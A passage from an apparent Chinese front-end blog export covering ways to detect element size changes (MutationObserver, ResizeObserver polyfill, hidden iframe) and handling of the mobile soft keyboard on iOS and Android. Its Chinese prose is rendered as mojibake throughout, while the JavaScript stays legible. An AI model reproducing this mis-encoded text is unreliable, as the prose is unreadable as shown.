å†å‘ç”Ÿå˜åŠ¨ï¼Œä¹Ÿä¸ä¼šè§¦å‘è§‚å¯Ÿå™¨ã€‚ 12345678910111213141516var $text5 = document.createTextNode('æ–°å¢žæ–‡æœ¬èŠ‚ç‚¹5');var $text6 = document.createTextNode('æ–°å¢žæ–‡æœ¬èŠ‚ç‚¹6');// æ–°å¢žæ–‡æœ¬èŠ‚ç‚¹$tar.appendChild($text5);var record = mutationObserver.takeRecords();console.log('record: ', record); // è¿”å›ž è®°å½•æ–°å¢žæ–‡æœ¬èŠ‚ç‚¹æ“ä½œï¼Œå¹¶æ¸…ç©ºç›‘å¬é˜Ÿåˆ—// æ›¿æ¢æ–‡æœ¬èŠ‚ç‚¹$tar.replaceChild($text6, $text5);mutationObserver.disconnect(); // æ­¤å¤„ä»¥åŽçš„ä¸å†ç›‘å¬// åˆ é™¤æ–‡æœ¬èŠ‚ç‚¹$tar.removeChild($text6); // ç›‘å¬ä¸åˆ° å‰é¢è¿˜æœ‰ä¸¤ä¸ªå±žæ€§ attributeOldValue å’Œ characterDataOldValue æ²¡æœ‰è¯´ï¼Œå…¶å®žæ˜¯å½±å“ takeRecords() æ–¹æ³•è¿”å›ž MutationRecord å®žä¾‹ã€‚å¦‚æžœè®¾ç½®äº†è¿™ä¸¤ä¸ªå±žæ€§ï¼Œå°±ä¼šå¯¹åº”è¿”å›žå¯¹è±¡ä¸­ oldValue ä¸ºè®°å½•ä¹‹å‰æ—§çš„ attribute å’Œ dataå€¼ã€‚ æ¯”å¦‚å°†åŽŸæ¥çš„ className çš„å€¼ aaa æ›¿æ¢æˆ tarï¼ŒoldValue è®°å½•ä¸º aaaã€‚ 1234567891011record: [&#123; addedNodes: NodeList [] attributeName: "class" attributeNamespace: null nextSibling: null oldValue: "aaa" previousSibling: null removedNodes: NodeList [] target: div#tar.tar type: "attributes"&#125;] MutationObserver çš„åº”ç”¨ä¸€ä¸ªå®¹å™¨æœ¬èº«ä»¥åŠå†…éƒ¨å…ƒç´ çš„å±žæ€§å˜åŒ–ï¼ŒèŠ‚ç‚¹å˜åŒ–å’Œæ–‡æœ¬å˜åŒ–æ˜¯å½±å“è¯¥å®¹å™¨é«˜å®½çš„é‡è¦å› ç´ ï¼ˆå½“ç„¶è¿˜æœ‰å…¶ä»–å› ç´ ï¼‰ï¼Œä»¥ä¸Šäº†è§£äº† MutationObserver API çš„ä¸€äº›ç»†èŠ‚ï¼Œå¯ä»¥å®žçŽ°ç›‘å¬å®¹å™¨å®½é«˜çš„å˜åŒ–ã€‚ 12345678910111213141516171819202122var $tar = document.getElementById('tar');var MutationObserver = window.MutationObserver || window.webkitMutationObserver || window.MozMutationObserver;var recordHeight = 0;var mutationObserver = new MutationObserver(function (mutations) &#123; console.log(mutations); let height = window.getComputedStyle($tar).getPropertyValue('height'); if (height === recordHeight) &#123; return; &#125; recordHeight = height; console.log('é«˜åº¦å˜åŒ–äº†'); // ä¹‹åŽæ›´æ–°å¤–éƒ¨å®¹å™¨ç­‰æ“ä½œ&#125;)mutationObserver.observe($tar, &#123; childList: true, // å­èŠ‚ç‚¹çš„å˜åŠ¨ï¼ˆæ–°å¢žã€åˆ é™¤æˆ–è€…æ›´æ”¹ï¼‰ attributes: true, // å±žæ€§çš„å˜åŠ¨ characterData: true, // èŠ‚ç‚¹å†…å®¹æˆ–èŠ‚ç‚¹æ–‡æœ¬çš„å˜åŠ¨ subtree: true // æ˜¯å¦å°†è§‚å¯Ÿå™¨åº”ç”¨äºŽè¯¥èŠ‚ç‚¹çš„æ‰€æœ‰åŽä»£èŠ‚ç‚¹&#125;) æ¼ç½‘ä¹‹é±¼ï¼šåŠ¨ç”»ï¼ˆanimationã€transformï¼‰æ”¹å˜å®¹å™¨é«˜ï¼ˆå®½ï¼‰é™¤äº†å®¹å™¨å†…éƒ¨å…ƒç´ èŠ‚ç‚¹ã€å±žæ€§å˜åŒ–ï¼Œè¿˜æœ‰ css3 åŠ¨ç”»ä¼šå½±å“å®¹å™¨é«˜å®½ï¼Œç”±äºŽåŠ¨ç”»å¹¶ä¸ä¼šé€ æˆå…ƒç´ å±žæ€§çš„å˜åŒ–ï¼Œæ‰€ä»¥ MutationObserver API æ˜¯ç›‘å¬ä¸åˆ°çš„ã€‚ å°† #tar å®¹å™¨åŠ å…¥ä»¥ä¸‹ css åŠ¨ç”» 1234567891011@keyframes changeHeight &#123; to &#123; height: 300px; &#125;&#125;#tar &#123; background-color: aqua; border: 1px solid #ccc; animation: changeHeight 2s ease-in 1s;&#125; å¯ä»¥çœ‹å‡ºï¼Œæ²¡æœ‰æ‰“å°è¾“å‡ºï¼Œæ˜¯ç›‘å¬ä¸åˆ°åŠ¨ç”»æ”¹å˜é«˜å®½çš„ã€‚æ‰€ä»¥ï¼Œåœ¨è¿™è¿˜éœ€å¯¹è¿™æ¡â€œæ¼ç½‘ä¹‹é±¼â€è¿›è¡Œå¤„ç†ã€‚å¤„ç†å¾ˆç®€å•ï¼Œåªéœ€åœ¨åŠ¨ç”»ï¼ˆtransitionendã€animationendï¼‰åœæ­¢äº‹ä»¶è§¦å‘æ—¶ç›‘å¬é«˜å®½å˜åŒ–å³å¯ã€‚åœ¨è¿™é‡Œç”¨ Vue è‡ªå®šä¹‰æŒ‡ä»¤å¤„ç†å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * ç›‘å¬å…ƒç´ é«˜åº¦å˜åŒ–ï¼Œæ›´æ–°æ»šåŠ¨å®¹å™¨ */Vue.directive('observe-element-height', &#123; insert (el, binding) &#123; const MutationObserver = window.MutationObserver || window.webkitMutationObserver || window.MozMutationObserver let recordHeight = 0 const onHeightChange = _.throttle(function () &#123; // _.throttle èŠ‚æµå‡½æ•° let height = window.getComputedStyle(el).getPropertyValue('height'); if (height === recordHeight) &#123; return &#125; recordHeight = height console.log('é«˜åº¦å˜åŒ–äº†') // ä¹‹åŽæ›´æ–°å¤–éƒ¨å®¹å™¨ç­‰æ“ä½œ &#125;, 500) el.__onHeightChange__ = onHeightChange el.addEventListener('animationend', onHeightChange) el.addEventListener('transitionend', onHeightChange) el.__observer__ = new MutationObserver((mutations) =&gt; &#123; onHeightChange() &#125;); el.__observer__.observe(el, &#123; childList: true, subtree: true, characterData: true, attributes: true &#125;) &#125;, unbind (el) &#123; if (el.__observer__) &#123; el.__observer__.disconnect() el.__observer__ = null &#125; el.removeEventListener('animationend', el.__onHeightChange__) el.removeEventListener('transitionend', el.__onHeightChange__) el.__onHeightChange__ = null &#125;&#125;) ResizeObserveræ—¢ç„¶å¯¹å®¹å™¨åŒºåŸŸå®½é«˜ç›‘å¬æœ‰ç¡¬æ€§éœ€æ±‚ï¼Œé‚£ä¹ˆæ˜¯å¦æœ‰ç›¸å…³è§„èŒƒå‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼ŒResizeObserver æŽ¥å£å¯ä»¥ç›‘å¬åˆ° Element çš„å†…å®¹åŒºåŸŸæˆ– SVGElement çš„è¾¹ç•Œæ¡†æ”¹å˜ã€‚å†…å®¹åŒºåŸŸåˆ™éœ€è¦å‡åŽ»å†…è¾¹è· paddingã€‚ç›®å‰è¿˜æ˜¯å®žéªŒæ€§çš„ä¸€ä¸ªæŽ¥å£ï¼Œå„å¤§æµè§ˆå™¨å¯¹ResizeObserverå…¼å®¹æ€§ä¸å¤Ÿï¼Œå®žé™…åº”ç”¨éœ€è°¨æ…Žã€‚ ResizeObserver Polyfillå®žéªŒæ€§çš„ API ä¸è¶³ï¼Œæ€»æœ‰ Polyfill æ¥å¼¥è¡¥ã€‚ ResizeObserver Polyfill åˆ©ç”¨äº‹ä»¶å†’æ³¡ï¼Œåœ¨é¡¶å±‚ document ä¸Šç›‘å¬åŠ¨ç”» transitionendï¼› ç›‘å¬ window çš„ resize äº‹ä»¶ï¼› å…¶æ¬¡ç”¨ MutationObserver ç›‘å¬ document å…ƒç´ ï¼› å…¼å®¹IE11ä»¥ä¸‹ é€šè¿‡ DOMSubtreeModified ç›‘å¬ document å…ƒç´ ã€‚ åˆ©ç”¨MapShim ï¼ˆç±»ä¼¼ES6ä¸­ Mapï¼‰ æ•°æ®ç»“æž„ï¼Œkey ä¸ºè¢«ç›‘å¬å…ƒç´ ï¼Œvalue ä¸º ResizeObserver å®žä¾‹ï¼Œæ˜ å°„ç›‘å¬å…³ç³»ï¼Œé¡¶å±‚ document æˆ– window ç›‘å¬åˆ°è§¦å‘äº‹ä»¶ï¼Œé€šè¿‡ç»‘å®šå…ƒç´ å³å¯ç›‘å¬å…ƒç´ å°ºå¯¸å˜åŒ–ã€‚éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132/** * Initializes DOM listeners. * * @private * @returns &#123;void&#125; */ResizeObserverController.prototype.connect_ = function () &#123; // Do nothing if running in a non-browser environment or if listeners // have been already added. if (!isBrowser || this.connected_) &#123; return; &#125; // Subscription to the "Transitionend" event is used as a workaround for // delayed transitions. This way it's possible to capture at least the // final state of an element. document.addEventListener('transitionend', this.onTransitionEnd_); window.addEventListener('resize', this.refresh); if (mutationObserverSupported) &#123; this.mutationsObserver_ = new MutationObserver(this.refresh); this.mutationsObserver_.observe(document, &#123; attributes: true, childList: true, characterData: true, subtree: true &#125;); &#125; else &#123; document.addEventListener('DOMSubtreeModified', this.refresh); this.mutationEventsAdded_ = true; &#125; this.connected_ = true;&#125;; PS:ä¸è¿‡ï¼Œè¿™é‡Œè²Œä¼¼ä½œè€…æ²¡æœ‰å¯¹ animation åšå¤„ç†ï¼Œä¹Ÿå°±æ˜¯ animation æ”¹å˜å…ƒç´ å°ºå¯¸è¿˜æ˜¯ç›‘å¬ä¸åˆ°ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ²¡æœ‰å…¨é¢çš„è€ƒè™‘ï¼Œè¿™ç‚¹å·²å‘ä½œè€…æäº†issueã€‚ ç”¨ iframe æ¨¡æ‹Ÿ window çš„ resizewindow çš„ resize æ²¡æœ‰å…¼å®¹æ€§é—®é¢˜ï¼ŒæŒ‰ç…§è¿™ä¸ªæ€è·¯ï¼Œå¯ä»¥ç”¨éšè—çš„ iframe æ¨¡æ‹Ÿ window æ’‘æ»¡è¦ç›‘å¬å¾—å®¹å™¨å…ƒç´ ï¼Œå½“å®¹å™¨å°ºå¯¸å˜åŒ–æ—¶ï¼Œè‡ªç„¶ä¼š iframe å°ºå¯¸ä¹Ÿä¼šæ”¹å˜ï¼Œé€šè¿‡contentWindow.onresize() å°±èƒ½ç›‘å¬å¾—åˆ°ã€‚ 123456789101112131415161718192021function observeResize(element, handler) &#123; let frame = document.createElement('iframe'); const CSS = 'position:absolute;left:0;top:-100%;width:100%;height:100%;margin:1px 0 0;border:none;opacity:0;visibility:hidden;pointer-events:none;'; frame.style.cssText = CSS; frame.onload = () =&gt; &#123; frame.contentWindow.onresize = () =&gt; &#123; handler(element); &#125;; &#125;; element.appendChild(frame); return frame;&#125;let element = document.getElementById('main');// listen for resizeobserveResize(element, () =&gt; &#123; console.log('new size: ', &#123; width: element.clientWidth, height: element.clientHeight &#125;);&#125;); é‡‡ç”¨è¿™ç§æ–¹æ¡ˆå¸¸ç”¨æ’ä»¶æœ‰ iframe-resizerã€resize-sensorç­‰ã€‚ä¸è¿‡è¿™ç§æ–¹æ¡ˆä¸æ˜¯ç‰¹åˆ«ä¼˜é›…ï¼Œéœ€è¦æ’å…¥ iframe å…ƒç´ ï¼Œè¿˜éœ€å°†çˆ¶å…ƒç´ å®šä½ï¼Œå¯èƒ½åœ¨é¡µé¢ä¸Šä¼šæœ‰å…¶ä»–æ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œä»…ä½œä¸ºä¾›å‚è€ƒæ–¹æ¡ˆå§ã€‚ æ€»ç»“æœ€åŽï¼Œè¦ä¼˜é›…åœ°ç›‘å¬å…ƒç´ çš„å®½é«˜å˜åŒ–ï¼Œä¸è¦åŽ»æ ¹æ®äº¤äº’è¡Œä¸ºè€Œæ˜¯ä»Žå…ƒç´ æœ¬èº«åŽ»ç›‘å¬ï¼Œäº†è§£ MutationObserver æŽ¥å£æ˜¯é‡ç‚¹ï¼Œå…¶æ¬¡è¦è€ƒè™‘åˆ°å…ƒç´ åŠ¨ç”»å¯èƒ½é€ æˆå®½é«˜å˜åŒ–ï¼Œå…¼å®¹IE11ä»¥ä¸‹ï¼Œé€šè¿‡ DOMSubtreeModified ç›‘å¬ã€‚ç”¨ iframe æ¨¡æ‹Ÿ window çš„ resize å±žäºŽä¸€ç§ä¾›å‚è€ƒæ–¹æ¡ˆã€‚åšçš„åŠŸè¯¾æœ‰ç‚¹å°‘ï¼Œæ¬¢è¿ŽæŒ‡æ­£ï¼Œå®Œ~]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¯èƒ½è¿™äº›æ˜¯ä½ æƒ³è¦çš„H5é”®ç›˜å…¼å®¹æ–¹æ¡ˆ]]></title>
    <url>%2F2019%2F03%2F19%2Fh5-keyboard-compatible%2F</url>
    <content type="text"><![CDATA[å‰è¨€æœ€è¿‘ä¸€æ®µæ—¶é—´åœ¨åš H5 èŠå¤©é¡¹ç›®ï¼Œè¸©è¿‡å…¶ä¸­ä¸€å¤§å‘ï¼šè¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹ï¼Œè½¯é”®ç›˜å¼¹èµ·ï¼Œè¦æ±‚è¾“å…¥æ¡†å¸é™„ï¼ˆæˆ–é¡¶ï¼‰åœ¨è¾“å…¥æ³•æ¡†ä¸Šã€‚éœ€æ±‚å¾ˆæ˜Žç¡®ï¼Œçœ‹ä¼¼å¾ˆç®€å•ï¼Œå…¶å®žä¸ç„¶ã€‚ä»Žå®žéªŒè¿‡ä¸€äº›æœºåž‹ä¸Šçœ‹ï¼Œå‘çŽ°ä¸»è¦å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š åœ¨ Android å’Œ IOS ä¸Šï¼ŒèŽ·çŸ¥è½¯é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·çŠ¶æ€å­˜åœ¨å·®å¼‚ï¼Œä¸”é¡µé¢ webview è¡¨çŽ°ä¸åŒã€‚ åœ¨IOS12 ä¸Šï¼Œå¾®ä¿¡ç‰ˆæœ¬ v6.7.4 åŠä»¥ä¸Šï¼Œè¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹ï¼Œé”®ç›˜å¼¹èµ·ï¼Œé¡µé¢ï¼ˆwebviewï¼‰æ•´ä½“å¾€ä¸Šæ»šåŠ¨ï¼Œå½“é”®ç›˜æ”¶èµ·åŽï¼Œä¸å›žåˆ°åŽŸä½ï¼Œå¯¼è‡´é”®ç›˜åŽŸæ¥æ‰€åœ¨ä½ç½®æ˜¯ç©ºç™½çš„ã€‚ åœ¨ IOS ä¸Šï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹è¾“å…¥æ³•ï¼Œé«˜åº¦è®¡ç®—å­˜åœ¨åå·®ï¼Œå¯¼è‡´åœ¨æœ‰äº›è¾“å…¥æ³•å¼¹èµ·ï¼Œå°†è¾“å…¥æ¡†æŒ¡ä½ä¸€éƒ¨åˆ†ã€‚ åœ¨æœ‰äº›æµè§ˆå™¨ä¸Šä½¿ç”¨ä¸€äº›æ“ä½œæŠ€å·§ï¼Œè¿˜æ˜¯å­˜åœ¨è¾“å…¥æ¡†è¢«è¾“å…¥æ³•é®æŒ¡ã€‚ ä¸‹é¢å°±ä¸Šè¿°å‘çŽ°çš„é—®é¢˜ï¼Œé€ä¸ªæŽ¢ç´¢ä¸€ä¸‹è§£å†³æ–¹æ¡ˆã€‚ èŽ·çŸ¥è½¯é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·çŠ¶æ€èŽ·çŸ¥è½¯é”®ç›˜çš„å¼¹èµ·è¿˜æ˜¯æ”¶èµ·çŠ¶æ€å¾ˆé‡è¦ï¼ŒåŽé¢çš„å…¼å®¹å¤„ç†éƒ½è¦ä»¥æ­¤ä¸ºå‰æã€‚ç„¶è€Œï¼ŒH5 å¹¶æ²¡æœ‰ç›´æŽ¥ç›‘å¬è½¯é”®ç›˜çš„åŽŸç”Ÿäº‹ä»¶ï¼Œåªèƒ½é€šè¿‡è½¯é”®ç›˜å¼¹èµ·æˆ–æ”¶èµ·ï¼Œå¼•å‘é¡µé¢å…¶ä»–æ–¹é¢çš„è¡¨çŽ°é—´æŽ¥ç›‘å¬ï¼Œæ›²çº¿æ•‘å›½ã€‚å¹¶ä¸”ï¼Œåœ¨ IOS å’Œ Android ä¸Šçš„è¡¨çŽ°ä¸å°½ç›¸åŒã€‚ IOS è½¯é”®ç›˜å¼¹èµ·è¡¨çŽ°åœ¨ IOS ä¸Šï¼Œè¾“å…¥æ¡†ï¼ˆinputã€textarea æˆ– å¯Œæ–‡æœ¬ï¼‰èŽ·å–ç„¦ç‚¹ï¼Œé”®ç›˜å¼¹èµ·ï¼Œé¡µé¢ï¼ˆwebviewï¼‰å¹¶æ²¡æœ‰è¢«åŽ‹ç¼©ï¼Œæˆ–è€…è¯´é«˜åº¦ï¼ˆheightï¼‰æ²¡æœ‰æ”¹å˜ï¼Œåªæ˜¯é¡µé¢ï¼ˆwebviewï¼‰æ•´ä½“å¾€ä¸Šæ»šäº†ï¼Œä¸”æœ€å¤§æ»šåŠ¨é«˜åº¦ï¼ˆscrollTopï¼‰ä¸ºè½¯é”®ç›˜é«˜åº¦ã€‚ Android è½¯é”®ç›˜å¼¹èµ·è¡¨çŽ°åŒæ ·ï¼Œåœ¨ Android ä¸Šï¼Œè¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹ï¼Œé”®ç›˜å¼¹èµ·ï¼Œä½†æ˜¯é¡µé¢ï¼ˆwebviewï¼‰é«˜åº¦ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé«˜åº¦ä¸ºå¯è§†åŒºé«˜åº¦ï¼ˆåŽŸé«˜åº¦å‡åŽ»è½¯é”®ç›˜é«˜åº¦ï¼‰ï¼Œé™¤äº†å› ä¸ºé¡µé¢å†…å®¹è¢«æ’‘å¼€å¯ä»¥äº§ç”Ÿæ»šåŠ¨ï¼Œwebview æœ¬èº«ä¸èƒ½æ»šåŠ¨ã€‚ IOS è½¯é”®ç›˜æ”¶èµ·è¡¨çŽ°è§¦å‘è½¯é”®ç›˜ä¸Šçš„â€œæ”¶èµ·â€æŒ‰é’®é”®ç›˜æˆ–è€…è¾“å…¥æ¡†ä»¥å¤–çš„é¡µé¢åŒºåŸŸæ—¶ï¼Œè¾“å…¥æ¡†å¤±åŽ»ç„¦ç‚¹ï¼Œè½¯é”®ç›˜æ”¶èµ·ã€‚ Android è½¯é”®ç›˜æ”¶èµ·è¡¨çŽ°è§¦å‘è¾“å…¥æ¡†ä»¥å¤–çš„åŒºåŸŸæ—¶ï¼Œè¾“å…¥æ¡†å¤±åŽ»ç„¦ç‚¹ï¼Œè½¯é”®ç›˜æ”¶èµ·ã€‚ä½†æ˜¯ï¼Œè§¦å‘é”®ç›˜ä¸Šçš„æ”¶èµ·æŒ‰é’®é”®ç›˜æ—¶ï¼Œè¾“å…¥æ¡†å¹¶ä¸ä¼šå¤±åŽ»ç„¦ç‚¹ï¼ŒåŒæ ·è½¯é”®ç›˜æ”¶èµ·ã€‚ ç›‘å¬è½¯é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·ç»¼åˆä¸Šé¢é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·åœ¨ IOS å’Œ Android ä¸Šçš„ä¸åŒè¡¨çŽ°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†å¼€è¿›è¡Œå¦‚ä¸‹å¤„ç†æ¥ç›‘å¬è½¯é”®ç›˜çš„å¼¹èµ·å’Œæ”¶èµ·ï¼š åœ¨ IOS ä¸Šï¼Œç›‘å¬è¾“å…¥æ¡†çš„ focus äº‹ä»¶æ¥èŽ·çŸ¥è½¯é”®ç›˜å¼¹èµ·ï¼Œç›‘å¬è¾“å…¥æ¡†çš„ blur äº‹ä»¶èŽ·çŸ¥è½¯é”®ç›˜æ”¶èµ·ã€‚ åœ¨ Android ä¸Šï¼Œç›‘å¬ webview é«˜åº¦ä¼šå˜åŒ–ï¼Œé«˜åº¦å˜å°èŽ·çŸ¥è½¯é”®ç›˜å¼¹èµ·ï¼Œå¦åˆ™è½¯é”®ç›˜æ”¶èµ·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// åˆ¤æ–­è®¾å¤‡ç±»åž‹var judgeDeviceType = function () &#123; var ua = window.navigator.userAgent.toLocaleLowerCase(); var isIOS = /iphone|ipad|ipod/.test(ua); var isAndroid = /android/.test(ua); return &#123; isIOS: isIOS, isAndroid: isAndroid &#125;&#125;()// ç›‘å¬è¾“å…¥æ¡†çš„è½¯é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·äº‹ä»¶function listenKeybord($input) &#123; if (judgeDeviceType.isIOS) &#123; // IOS é”®ç›˜å¼¹èµ·ï¼šIOS å’Œ Android è¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹é”®ç›˜å¼¹èµ· $input.addEventListener('focus', function () &#123; console.log('IOS é”®ç›˜å¼¹èµ·å•¦ï¼'); // IOS é”®ç›˜å¼¹èµ·åŽæ“ä½œ &#125;, false) // IOS é”®ç›˜æ”¶èµ·ï¼šIOS ç‚¹å‡»è¾“å…¥æ¡†ä»¥å¤–åŒºåŸŸæˆ–ç‚¹å‡»æ”¶èµ·æŒ‰é’®ï¼Œè¾“å…¥æ¡†éƒ½ä¼šå¤±åŽ»ç„¦ç‚¹ï¼Œé”®ç›˜ä¼šæ”¶èµ·ï¼Œ $input.addEventListener('blur', () =&gt; &#123; console.log('IOS é”®ç›˜æ”¶èµ·å•¦ï¼'); // IOS é”®ç›˜æ”¶èµ·åŽæ“ä½œ &#125;) &#125; // Andriod é”®ç›˜æ”¶èµ·ï¼šAndriod é”®ç›˜å¼¹èµ·æˆ–æ”¶èµ·é¡µé¢é«˜åº¦ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä»¥æ­¤ä¸ºä¾æ®èŽ·çŸ¥é”®ç›˜æ”¶èµ· if (judgeDeviceType.isAndroid) &#123; var originHeight = document.documentElement.clientHeight || document.body.clientHeight; window.addEventListener('resize', function () &#123; var resizeHeight = document.documentElement.clientHeight || document.body.clientHeight; if (originHeight &lt; resizeHeight) &#123; console.log('Android é”®ç›˜æ”¶èµ·å•¦ï¼'); // Android é”®ç›˜æ”¶èµ·åŽæ“ä½œ &#125; else &#123; console.log('Android é”®ç›˜å¼¹èµ·å•¦ï¼'); // Android é”®ç›˜å¼¹èµ·åŽæ“ä½œ &#125; originHeight = resizeHeight; &#125;, false) &#125;&#125;var $inputs = document.querySelectorAll('.input');for (var i = 0; i &lt; $inputs.length; i++) &#123; listenKeybord($inputs[i]);&#125; å¼¹èµ·è½¯é”®ç›˜å§‹ç»ˆè®©è¾“å…¥æ¡†æ»šåŠ¨åˆ°å¯è§†åŒºæœ‰æ—¶æˆ‘ä»¬ä¼šåšä¸€ä¸ªè¾“å…¥è¡¨å•ï¼Œæœ‰å¾ˆå¤šè¾“å…¥é¡¹ï¼Œè¾“å…¥æ¡†èŽ·å–ç„¦ç‚¹ï¼Œå¼¹èµ·è½¯é”®ç›˜ã€‚å½“è¾“å…¥æ¡†ä½äºŽé¡µé¢ä¸‹éƒ¨ä½ç½®æ—¶ï¼Œåœ¨ IOS ä¸Šï¼Œä¼šå°† webview æ•´ä½“å¾€ä¸Šæ»šä¸€æ®µè·ç¦»ï¼Œä½¿å¾—è¯¥èŽ·å–ç„¦ç‚¹çš„è¾“å…¥æ¡†è‡ªåŠ¨å¤„äºŽå¯è§†åŒºï¼Œè€Œåœ¨ Android åˆ™ä¸ä¼šè¿™æ ·ï¼Œå®ƒåªä¼šæ”¹å˜é¡µé¢é«˜åº¦ï¼Œè€Œä¸ä¼šåŽ»æ»šåŠ¨åˆ°å½“å‰ç„¦ç‚¹å…ƒç´ åˆ°å¯è§†åŒºã€‚ç”±äºŽä¸Šé¢å·²ç»å®žçŽ°ç›‘å¬ IOS å’Œ Android é”®ç›˜å¼¹èµ·å’Œæ”¶èµ·ï¼Œåœ¨è¿™é‡Œï¼Œåªéœ€åœ¨ Android é”®ç›˜å¼¹èµ·åŽï¼Œå°†ç„¦ç‚¹å…ƒç´ æ»šåŠ¨ï¼ˆscrollIntoView()ï¼‰åˆ°å¯è§†åŒºã€‚æŸ¥çœ‹æ•ˆæžœï¼Œå¯ä»¥æˆ³è¿™é‡Œã€‚ 12345678910111213141516// èŽ·å–åˆ°ç„¦ç‚¹å…ƒç´ æ»šåŠ¨åˆ°å¯è§†åŒºfunction activeElementScrollIntoView(activeElement, delay) &#123; var editable = activeElement.getAttribute('contenteditable') // è¾“å…¥æ¡†ã€textareaæˆ–å¯Œæ–‡æœ¬èŽ·å–ç„¦ç‚¹åŽæ²¡æœ‰å°†è¯¥å…ƒç´ æ»šåŠ¨åˆ°å¯è§†åŒº if (activeElement.tagName == 'INPUT' || activeElement.tagName == 'TEXTAREA' || editable === '' || editable) &#123; setTimeout(function () &#123; activeElement.scrollIntoView(); &#125;, delay) &#125;&#125;// ...// Android é”®ç›˜å¼¹èµ·åŽæ“ä½œactiveElementScrollIntoView($input, 1000);// ... å”¤èµ·çº¯æ•°å­—è½¯é”®ç›˜ä¸Šé¢çš„è¡¨å•è¾“å…¥æ¡†æœ‰è¦æ±‚è¾“å…¥ç”µè¯å·ç ï¼Œç±»ä¼¼è¿™æ ·å°±è¦å¼¹å‡ºä¸€ä¸ªæ•°å­—è½¯é”®ç›˜äº†ï¼Œæ—¢ç„¶è¯´åˆ°äº†è½¯é”®ç›˜å…¼å®¹ï¼Œåœ¨è¿™é‡Œå°±å®‰æ’ä¸€ä¸‹ã€‚æ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š 12&lt;p&gt;è¯·è¾“å…¥æ‰‹æœºå·&lt;/p&gt;&lt;input type="tel" novalidate="novalidate" pattern="[0-9]*" class="input"&gt; type=&quot;tel&quot;ï¼Œ æ˜¯ HTML5 çš„ä¸€ä¸ªå±žæ€§ï¼Œè¡¨ç¤ºè¾“å…¥æ¡†ç±»åž‹ä¸ºç”µè¯å·ç ï¼Œåœ¨ Android å’Œ IOS ä¸Šè¡¨çŽ°å·®ä¸å¤šï¼Œéƒ½ä¼šæœ‰æ•°å­—é”®ç›˜ï¼Œä½†æ˜¯ä¹Ÿä¼šæœ‰å­—æ¯ï¼Œç•¥æ˜¾å¤šä½™ã€‚ pattern=&quot;[0-9]&quot;ï¼Œ pattern ç”¨äºŽéªŒè¯è¡¨å•è¾“å…¥çš„å†…å®¹ï¼Œé€šå¸¸ HTML5 çš„ type å±žæ€§ï¼Œæ¯”å¦‚ emailã€telã€numberã€data ç±»ã€url ç­‰ï¼Œå·²ç»è‡ªå¸¦äº†ç®€å•çš„æ•°æ®æ ¼å¼éªŒè¯åŠŸèƒ½äº†ï¼ŒåŠ ä¸Š pattern åŽï¼Œå‰ç«¯éƒ¨åˆ†çš„éªŒè¯æ›´åŠ ç®€å•é«˜æ•ˆäº†ã€‚IOS ä¸­ï¼Œåªæœ‰ [0-9]\* æ‰å¯ä»¥è°ƒèµ·ä¹å®«æ ¼æ•°å­—é”®ç›˜ï¼Œ\d æ— æ•ˆï¼ŒAndroid 4.4 ä»¥ä¸‹ï¼ˆåŒ…æ‹¬X5å†…æ ¸ï¼‰ï¼Œä¸¤è€…éƒ½è°ƒèµ·æ•°å­—é”®ç›˜ã€‚ novalidate=&quot;novalidate&quot;ï¼Œnovalidate å±žæ€§è§„å®šå½“æäº¤è¡¨å•æ—¶ä¸å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼Œç”±äºŽ pattern æ ¡éªŒå…¼å®¹æ€§ä¸å¥½ï¼Œå¯ä»¥ä¸è®©å…¶æ ¡éªŒï¼Œåªè®©å…¶å”¤èµ·çº¯æ•°å­—é”®ç›˜ï¼Œæ ¡éªŒå·¥ä½œç”± js åŽ»åšã€‚ å…¼å®¹ IOS12 + V6.7.4+å¦‚æžœä½ åœ¨ç”¨ IOS12 å’Œ V6.7.4+ç‰ˆæœ¬çš„å¾®ä¿¡æµè§ˆå™¨æ‰“å¼€ä¸Šé¢è¡¨å•è¾“å…¥çš„ demo ï¼Œå°±ä¼šæƒŠå¥‡çš„å‘çŽ°é”®ç›˜æ”¶èµ·åŽï¼ŒåŽŸæœ¬è¢«æ»šåŠ¨é¡¶èµ·çš„é¡µé¢å¹¶æ²¡æœ‰å›žåˆ°åº•éƒ¨ä½ç½®ï¼Œå¯¼è‡´åŽŸæ¥é”®ç›˜å¼¹èµ·çš„ä½ç½®â€œç©ºâ€äº†ã€‚ å…¶å®žè¿™æ˜¯ Apple åœ¨ IOS çš„ bugï¼Œä¼šå‡ºçŽ°åœ¨æ‰€æœ‰çš„ Xcode10 æ‰“åŒ…çš„ IOS12 çš„è®¾å¤‡ä¸Šã€‚å¾®ä¿¡å®˜æ–¹å·²ç»™å‡ºè§£å†³æ–¹æ¡ˆï¼Œåªéœ€åœ¨è½¯é”®ç›˜æ”¶èµ·åŽï¼Œå°†é¡µé¢ï¼ˆwebviewï¼‰æ»šå›žåˆ°çª—å£æœ€åº•éƒ¨ä½ç½®ï¼ˆclientHeightä½ç½®ï¼‰ã€‚ä¿®å¤åŽçš„ä¸Šé¢è¡¨å•è¾“å…¥ demo å¯ä»¥æˆ³è¿™é‡Œ 1234567891011121314console.log('IOS 